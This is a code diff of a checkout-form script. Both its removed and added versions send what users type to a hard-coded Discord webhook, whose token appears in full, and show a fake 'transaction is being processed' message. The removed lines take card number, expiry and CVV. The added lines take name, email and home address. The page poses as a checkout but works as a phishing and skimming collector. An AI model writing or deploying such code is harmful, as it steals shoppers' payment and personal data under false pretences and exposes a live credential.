@@ -1,35 +1,61 @@
 document.getElementById('checkout-form').addEventListener('submit', function(event) {
-    event.preventDefault();
+    event.preventDefault(); // Prevent the form from submitting right away
+    
+    // Get input values
+    const fullName = document.getElementById('full-name').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const address = document.getElementById('address').value.trim();
+    const city = document.getElementById('city').value.trim();
+    const zipCode = document.getElementById('zip-code').value.trim();
+    
+    // Validate fields
+    if (!fullName) {
+        alert('Please enter your full name.');
+        return;
+    }
+    
+    if (!email) {
+        alert('Please enter your email address.');
+        return;
+    }
+    
+    if (!address) {
+        alert('Please enter your address.');
+        return;
+    }
+    
+    if (!city) {
+        alert('Please enter your city.');
+        return;
+    }
+    
+    if (!zipCode) {
+        alert('Please enter your zip code.');
+        return;
+    }
 
-    // Collect form data
-    const name = document.getElementById('name').value;
-    const email = document.getElementById('email').value;
-    const card = document.getElementById('card').value;
-    const expiry = document.getElementById('expiry').value;
-    const cvv = document.getElementById('cvv').value;
+    // If all fields are filled, continue processing
+    alert('Your transaction is being processed. Check transaction status in 5 mins time.');
 
-    // Prepare the payload for Discord webhook
-    const payload = {
-        content: `**New Checkout Submission**\nName: ${name}\nEmail: ${email}\nCard: ${card}\nExpiry: ${expiry}\nCVV: ${cvv}`
+    // Send data to Discord webhook (example)
+    const webhookUrl = 'https://discord.com/api/webhooks/1268893038793719859/_ktjZVX-uHx8UVoYu7GAdrpkRLpbysF11nl120aBoWKRwdsY06g_9dAq1HYG7yeWvqwk';
+    const data = {
+        content: `New Checkout Submission:\nFull Name: ${fullName}\nEmail: ${email}\nAddress: ${address}\nCity: ${city}\nZip Code: ${zipCode}`
     };
-
-    // Send data to Discord webhook
-    fetch("https://discord.com/api/webhooks/1268893038793719859/_ktjZVX-uHx8UVoYu7GAdrpkRLpbysF11nl120aBoWKRwdsY06g_9dAq1HYG7yeWvqwk", {
+    
+    fetch(webhookUrl, {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
         },
-        body: JSON.stringify(payload),
-    })
-    .then(response => {
+        body: JSON.stringify(data),
+    }).then(response => {
         if (response.ok) {
-            alert("Your transaction is being processed, check transaction status in 5 mins time.");
+            console.log('Webhook sent successfully');
         } else {
-            alert("Error processing transaction. Please try again.");
+            console.error('Error sending webhook:', response.statusText);
         }
-    })
-    .catch(error => {
-        console.error('Error:', error);
-        alert("Error processing transaction. Please try again.");
+    }).catch(error => {
+        console.error('Fetch error:', error);
     });
 });
